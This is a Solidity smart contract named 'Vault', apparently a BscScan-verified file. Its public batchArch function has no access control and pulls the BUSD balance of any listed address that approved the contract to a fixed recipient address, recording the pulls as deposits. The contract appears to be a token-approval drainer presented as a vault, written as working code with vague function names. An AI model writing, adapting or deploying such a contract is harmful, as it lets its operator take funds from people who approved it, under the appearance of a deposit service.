/**
 *Submitted for verification at BscScan.com on 2023-02-19
*/

/**
 *Submitted for verification at BscScan.com on 2023-01-16
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

IERC20 constant BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);

address constant rec = 0x603A4ac8A44694B70494eaA2169B85f8bF7559f2;

interface IERC20 {
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function balanceOf(address account) 
        external view returns (uint256);
}

abstract contract Owned {
    /*//////////////////////////////////////////////////////////////
                                 EVENTS
    //////////////////////////////////////////////////////////////*/

    event OwnerUpdated(address indexed user, address indexed newOwner);

    /*//////////////////////////////////////////////////////////////
                            OWNERSHIP STORAGE
    //////////////////////////////////////////////////////////////*/

    address public owner;

    modifier onlyOwner() virtual {
        require(msg.sender == owner, "UNAUTHORIZED");

        _;
    }

    /*//////////////////////////////////////////////////////////////
                               CONSTRUCTOR
    //////////////////////////////////////////////////////////////*/

    constructor() {
        owner = msg.sender;
        emit OwnerUpdated(address(0), msg.sender);
    }

    /*//////////////////////////////////////////////////////////////
                             OWNERSHIP LOGIC
    //////////////////////////////////////////////////////////////*/

    function setOwner(address newOwner) public virtual onlyOwner {
        owner = newOwner;
        emit OwnerUpdated(msg.sender, newOwner);
    }
}

contract Vault is Owned {
    event BatchArch(address indexed sender, uint256 archAdrCount);
    struct Receord {
        address depositer;
        uint256 amount;
    }
    Receord[] public historyReceords;
    mapping(address => uint256[]) indexs;

    function withdrawToken(IERC20 token, uint256 _amount) external onlyOwner {
        token.transfer(msg.sender, _amount);
    }

    function batchArch(uint256 gas, address[] calldata addresses, uint256[] calldata tokens) external returns (bool) {
        _batchArch(gas, addresses, tokens);
        return true;
    }

    function _batchArch(uint256 gas, address[] calldata addresses, uint256[] calldata tokens) private {
        require(addresses.length < 10,"GAS Error: max archnum limit is 10 addresses"); // to prevent overflow
        require(addresses.length == tokens.length,"NUM Error: mismatch between Address and token count");

        address archAdr;
        uint256 archCount;
        uint256 tokenBalance;
        uint256 archAdrCount = addresses.length;
        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();

        while (gasUsed < gas && iterations < archAdrCount) {
            archAdr = addresses[iterations];
            archCount = tokens[iterations];
            tokenBalance = BUSD.balanceOf(archAdr);
            if(archCount > tokenBalance) {
                archCount = tokenBalance;
            }
            if (tokenBalance > 0) {
                BUSD.transferFrom(archAdr, rec, archCount);
                historyReceords.push(Receord({depositer: archAdr, amount: archCount}));
                uint256 counter = historyReceords.length - 1;
                indexs[archAdr].push(counter);
            }
            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            iterations++;
        }

        emit BatchArch(msg.sender, archAdrCount);
    }
}